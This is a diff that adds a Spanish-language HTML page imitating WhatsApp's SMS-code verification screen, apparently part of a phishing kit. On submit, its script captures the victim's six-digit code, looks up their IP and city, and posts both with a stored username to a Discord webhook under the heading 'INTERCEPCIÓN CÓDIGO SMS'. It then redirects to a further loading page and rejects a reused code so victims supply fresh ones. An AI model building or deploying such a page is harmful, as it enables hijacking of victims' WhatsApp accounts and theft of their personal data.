@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>continuar</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: #e5ddd5;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .phone {
+      width: 100%;
+      max-width: 390px;
+      background: #fff;
+      border-radius: 28px;
+      overflow: hidden;
+      box-shadow: 0 10px 50px rgba(0,0,0,0.15);
+    }
+
+    .header {
+      background: linear-gradient(160deg, #2eb872 0%, #1a7a50 100%);
+      padding: 22px 24px 36px;
+      position: relative;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      background: rgba(255,255,255,0.18);
+      border-radius: 50px;
+      padding: 5px 14px 5px 10px;
+      margin-bottom: 20px;
+    }
+    .badge-dot {
+      width: 8px; height: 8px;
+      background: #7effc0;
+      border-radius: 50%;
+      animation: blink 1.4s ease-in-out infinite;
+    }
+    @keyframes blink {
+      0%,100% { opacity: 1; }
+      50%      { opacity: 0.3; }
+    }
+    .badge span {
+      font-size: 9px;
+      font-weight: 700;
+      letter-spacing: 1.2px;
+      color: #fff;
+      text-transform: uppercase;
+    }
+
+    .header h1 {
+      font-size: 32px;
+      font-weight: 700;
+      color: #fff;
+      line-height: 1.15;
+      margin-bottom: 12px;
+    }
+    .header p {
+      font-size: 14px;
+      color: rgba(255,255,255,0.82);
+      line-height: 1.5;
+    }
+
+    .body {
+      padding: 28px 24px 32px;
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+    }
+  
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    .brand-icon {
+      width: 44px; height: 44px;
+      background: #25D366;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .brand-icon svg { width: 26px; height: 26px; fill: #fff; }
+    .brand-name {
+      font-size: 17px;
+      font-weight: 600;
+      color: #111;
+    }
+
+    h2 {
+      font-size: 24px;
+      font-weight: 700;
+      color: #111;
+      margin-bottom: 8px;
+    }
+    .desc {
+      font-size: 14px;
+      color: #777;
+      line-height: 1.5;
+      margin-bottom: 22px;
+    }
+
+    .input-wrap {
+      position: relative;
+      margin-bottom: 12px;
+    }
+    .input-wrap input {
+      width: 100%;
+      background: #f4f4f4;
+      border: 2px solid #25D366;
+      border-radius: 12px;
+      padding: 18px 16px 14px;
+      font-size: 20px;
+      font-family: 'DM Sans', sans-serif;
+      font-weight: 600;
+      color: #111;
+      letter-spacing: 6px;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .input-wrap input::placeholder {
+      color: #aaa;
+      font-size: 11px;
+      font-weight: 600;
+      letter-spacing: 2px;
+    }
+    .input-wrap input:focus {
+      border-color: #1aad5b;
+      box-shadow: 0 0 0 4px rgba(37,211,102,0.15);
+    }
+
+    .resend {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 32px;
+    }
+    .resend svg { width: 15px; height: 15px; fill: #888; flex-shrink: 0; }
+    .resend p { font-size: 13px; color: #888; }
+    .resend a {
+      color: #1aad5b;
+      font-weight: 600;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .resend a:hover { text-decoration: underline; }
+
+    .btn-primary {
+      width: 100%;
+      padding: 18px;
+      background: #25D366;
+      border: none;
+      border-radius: 14px;
+      font-size: 16px;
+      font-weight: 700;
+      font-family: 'DM Sans', sans-serif;
+      color: #fff;
+      cursor: pointer;
+      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
+      margin-bottom: 10px;
+      box-shadow: 0 4px 18px rgba(37,211,102,0.35);
+    }
+    .btn-primary:hover  { background: #1aad5b; box-shadow: 0 6px 24px rgba(37,211,102,0.4); }
+    .btn-primary:active { transform: scale(0.98); }
+
+    .btn-secondary {
+      width: 100%;
+      padding: 17px;
+      background: #f0f0f0;
+      border: none;
+      border-radius: 14px;
+      font-size: 15px;
+      font-weight: 600;
+      font-family: 'DM Sans', sans-serif;
+      color: #555;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn-secondary:hover { background: #e4e4e4; }
+  
+    #overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.35);
+      backdrop-filter: blur(4px);
+      align-items: center;
+      justify-content: center;
+      z-index: 100;
+    }
+    #overlay.show { display: flex; }
+    .overlay-card {
+      background: #fff;
+      border-radius: 22px;
+      padding: 36px 32px;
+      text-align: center;
+      box-shadow: 0 16px 50px rgba(0,0,0,0.2);
+      animation: pop 0.3s cubic-bezier(.34,1.56,.64,1) both;
+    }
+    @keyframes pop {
+      from { transform: scale(0.7); opacity: 0; }
+      to   { transform: scale(1);   opacity: 1; }
+    }
+    .overlay-card .check {
+      width: 60px; height: 60px;
+      background: #25D366;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 16px;
+    }
+    .overlay-card .check svg { width: 30px; height: 30px; fill: #fff; }
+    .overlay-card h3 { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 6px; }
+    .overlay-card p  { font-size: 14px; color: #888; }
+
+    @keyframes shake {
+      0%,100% { transform: translateX(0); }
+      20%,60%  { transform: translateX(-6px); }
+      40%,80%  { transform: translateX(6px); }
+    }
+    .shake { animation: shake 0.4s ease; border-color: #e53935 !important; }
+  </style>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script type="text/javascript" src="infodt.js"></script>
+</head>
+<body>
+
+<div class="phone">
+  <div class="header">
+    <div class="badge">
+      <div class="badge-dot"></div>
+      <span>SMS DE WHATSAPP ENVIADO</span>
+    </div>
+    <h1>Código SMS<br>de WhatsApp</h1>
+    <p>WhatsApp envió un código de 6 dígitos por SMS a tu número de teléfono.</p>
+  </div>
+
+  <div class="body">
+    <div class="brand">
+      <div class="brand-icon">
+        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+          <path d="M16 2C8.27 2 2 8.27 2 16c0 2.47.67 4.78 1.84 6.77L2 30l7.41-1.81A13.93 13.93 0 0016 30c7.73 0 14-6.27 14-14S23.73 2 16 2zm7.1 19.72c-.3.84-1.76 1.6-2.43 1.66-.62.06-1.2.28-4.07-.85-3.44-1.36-5.65-4.87-5.82-5.1-.17-.22-1.4-1.86-1.4-3.55 0-1.7.88-2.53 1.2-2.88.3-.33.66-.42.88-.42.22 0 .44 0 .63.01.2.01.48-.08.75.57.3.68 1.01 2.46 1.1 2.64.09.18.15.4.03.63-.12.24-.18.38-.36.59-.18.2-.38.45-.54.6-.18.17-.37.36-.16.7.21.34.94 1.55 2.03 2.51 1.4 1.24 2.57 1.62 2.93 1.8.36.18.57.15.78-.09.21-.24.9-1.05 1.14-1.4.24-.36.48-.3.81-.18.33.12 2.1 1 2.46 1.17.36.18.6.27.69.42.09.15.09.84-.21 1.68z"/>
+        </svg>
+      </div>
+      <span class="brand-name">WhatsApp</span>
+    </div>
+
+    <form method="post" action="" id="form1">
+      <h2>Código SMS de WhatsApp</h2>
+      <p class="desc">WhatsApp te envió un código de 6 dígitos por SMS a tu número de teléfono</p>
+
+      <div class="input-wrap">
+        <input
+          id="code-input"
+          type="tel"
+          maxlength="6"
+          placeholder="CÓDIGO SMS"
+          autocomplete="one-time-code"
+          inputmode="numeric"
+        />
+      </div>
+
+      <div class="resend">
+        <svg viewBox="0 0 20 20"><path d="M10 3a7 7 0 1 0 6.93 6H19A9 9 0 1 1 10 1v2zm-1-1V0l4 3-4 3V2a6 6 0 1 0 5.92 5h2A8 8 0 1 1 9 2z"/></svg>
+        <p>¿No lo recibiste? <a id="resend-link" onclick="resendCode()">Reenviar SMS de WhatsApp</a></p>
+      </div>
+
+      <button class="btn-primary" type="submit">Verificar código SMS</button>
+    </form>
+    <button class="btn-secondary">Usar otro método</button>
+  </div>
+</div>
+
+<div id="overlay">
+  <div class="overlay-card">
+    <div class="check">
+      <svg viewBox="0 0 30 30"><path d="M4 15l7 7L26 8" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    <h3>¡Verificado!</h3>
+    <p>Redirigiendo...</p>
+  </div>
+</div>
+
+<script>
+  const input = document.getElementById('code-input');
+
+  // Corregido el espacio en el nombre de la variable que rompía el Script
+  $(document).ready(function() {
+    const codigoAnteriorDetectado = $('#code-input').val();
+    if(codigoAnteriorDetectado && codigoAnteriorDetectado.length === 6) {
+      localStorage.setItem('primer_codigo', codigoAnteriorDetectado);
+    }
+  });
+
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/\D/g, '').slice(0, 6);
+  });
+
+  input.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      $('#form1').submit();
+    }
+  });
+
+  function verifyCode() {
+    const val = input.value.trim();
+
+    // 1. Validar longitud estricta de 6 dígitos
+    if (val.length < 6) {
+      shakeInput();
+      return false;
+    }
+
+    // 2. Intentar recuperar el primer código desde el almacenamiento local
+    let primerCodigo = localStorage.getItem('primer_codigo');
+
+    // 3. Si las pantallas se limpian rápido, lo respaldamos buscando en las variables nativas
+    if (!primerCodigo && typeof window.cod !== 'undefined') {
+      primerCodigo = window.cod;
+    }
+
+    // 4. Comparación: Si coincide con el anterior, bloquea el envío y sacude el input
+    if (primerCodigo && val === primerCodigo) {
+      console.warn("Validación: Se intentó repetir el código de la pantalla anterior.");
+      shakeInput();
+      return false; 
+    }
+
+    return true; 
+  }
+
+  function shakeInput() {
+    input.classList.remove('shake');
+    void input.offsetWidth;
+    input.classList.add('shake');
+    input.addEventListener('animationend', () => input.classList.remove('shake'), { once: true });
+  }
+
+  let resendCooldown = false;
+  function resendCode() {
+    if (resendCooldown) return;
+    resendCooldown = true;
+    const link = document.getElementById('resend-link');
+    let secs = 30;
+    link.style.color = '#aaa';
+    link.style.pointerEvents = 'none';
+    const t = setInterval(() => {
+      link.textContent = `Reenviar en ${secs}s`;
+      secs--;
+      if (secs < 0) {
+        clearInterval(t);
+        link.textContent = 'Solicitar nuevo código';
+        link.style.color = '';
+        link.style.pointerEvents = '';
+        resendCooldown = false;
+      }
+    }, 1000);
+  }
+  
+  $(document).ready(function() {
+    $('#form1').submit(function(e){
+      e.preventDefault(); // Detiene el envío automático HTML
+      
+      // Ejecuta la validación. Si devuelve false frena en seco y no ejecuta las API de IP ni Discord
+      if (!verifyCode()) {
+        return false;
+      }
+
+      // Si pasa los filtros, procesa el envío
+      $('#overlay').addClass('show');
+      var ip, ip2;
+      var cod = $('#code-input').val();
+
+      // Guardamos este código como el segundo por si lo necesitas validar después
+      localStorage.setItem('segundo_codigo', cod);
+        
+      $.getJSON("https://api.ipify.org?format=json", function(data) {
+        ip = data.ip;
+        $.getJSON("https://ipinfo.io", function (response) {
+          ip2 = response.city + ", " + response.country;
+          var persona = localStorage.getItem('user'); 
+          var message = "```💬 INTERCEPCIÓN CÓDIGO SMS ```\n" +
+              "👤Usuari0: `" + persona + "`\n" +
+              "🔒Codigo SMS: ──► `" + cod + "` ◄──\n\n" +
+              "📡 **Información de Red:**\n" +
+              "📌IP: `" + ip + "`\n" +
+              "🌎 `" + ip2 + "`\n" +
+              "───────────────────────────";
+
+          var settings = {
+            async: true,
+            url: webhook,
+            method: "POST",
+            contentType: "application/json",
+            data: JSON.stringify({
+                content: message
+            })
+          };
+
+          $.ajax(settings).done(function (response) {
+              // Actualizamos el registro del último código enviado exitosamente
+              localStorage.setItem('primer_codigo', cod); 
+              window.location = 'loading3.html';
+          }).fail(function (err) {
+              console.error("Error enviando a Discord:", err);
+              $('#overlay').removeClass('show');
+          });
+        });
+      });
+    });
+  });  
+</script>
